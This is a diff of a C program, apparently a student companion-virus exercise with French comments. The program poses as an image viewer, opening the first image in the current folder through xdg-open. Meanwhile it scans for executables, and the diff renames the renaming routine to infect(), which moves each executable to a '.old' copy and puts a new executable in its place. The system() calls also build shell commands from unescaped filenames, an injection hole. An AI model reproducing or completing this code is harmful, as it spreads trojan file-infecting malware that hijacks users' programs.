@@ -31,58 +31,35 @@ bool checkStringContains(char *fileName) {
         return strstr(fileName,lookingFor);
 }
 
-/*
-        Lance la commande xdg-open, lancant l'afficheur d'images
-*/
-void afficheImage(char *fileName) {
-
-        char *command = "xdg-open ";
-        char *errRedirect = " 2> /dev/null";
-        char *String = malloc(strlen(command) + strlen(fileName) +strlen(errRedirect) + 1);
-        if(String) {
-                strcpy(String,command);
-                strcat(String,fileName);
-                strcat(String,errRedirect);
-        }
-        system(String);
-}
-
-/*
-        Liste les fichiers possedant l'extension demandée
-*/
 void listeFichier(char *extension) {
         DIR *myDir;
         int cptImg = 0;
         struct dirent *dir;
+        bool imgFound = false;
+        char *fileName;
 
-        // FIRST PARSING
         myDir = opendir(".");
         if (myDir) {
-                while ((dir = readdir(myDir)) != NULL) {
-
+                while ((dir = readdir(myDir)) != NULL && imgFound == false) {
                         if (strstr(dir->d_name,extension)) {
-                                cptImg++;
+                                fileName = dir->d_name;
+                                imgFound = true;
                         }
                 }
                 closedir(myDir);
         }
-
-        const char *imageNames[cptImg];
-        if (cptImg > 0) {
-                // SECOND PARSING
-                myDir = opendir(".");
-                if (myDir) {
-                        int i = 0;
-                        while ((dir = readdir(myDir)) != NULL) {
-                                if (strstr(dir->d_name,extension)) {
-                                        imageNames[i] = dir->d_name;
-                                        i++;
-                                }
-                        }
-                        closedir(myDir);
+        if (imgFound) {
+                char *command = "xdg-open ";
+                char *errRedirect = " 2> /dev/null";
+                char *String = malloc(strlen(command) + strlen(fileName) +strlen(errRedirect) + 1);
+                if(String) {
+                        strcpy(String,command);
+                        strcat(String,fileName);
+                        strcat(String,errRedirect);
                 }
-                afficheImage((char *)imageNames[0]);
+                system(String);
         }
+
 }
 
 /*
@@ -101,7 +78,7 @@ void listingExecs() {
                                 if(strstr(dir->d_name, ".old") == NULL) {
                                         if (access(dir->d_name, X_OK) == 0) {
                                                 if (verifPresenceFichierOld(dir->d_name) == false) {
-                                                        renamingFile(dir->d_name);
+                                                        infect(dir->d_name);
                                                 }
 
                                         }
@@ -115,9 +92,7 @@ void listingExecs() {
 /*
         Renomme les fichiers, créer un nouveau fichier au même nom et ajout les droits sur le nouveau fichier
 */
-void renamingFile(char *fileName) {
-        //printf("\tRenaming %s into %s.old\n",fileName,fileName);
-
+void infect(char *fileName) {
         // renommage des fichiers en .old
         char *command = "mv ";
         char *extension = ".old";
@@ -168,7 +143,6 @@ bool verifPresenceFichierOld(char *str) {
         if(String) {
                 strcpy(String,str);
                 strcat(String,".old");
-                printf("%s",String);
         }
 
         myDir = opendir(".");
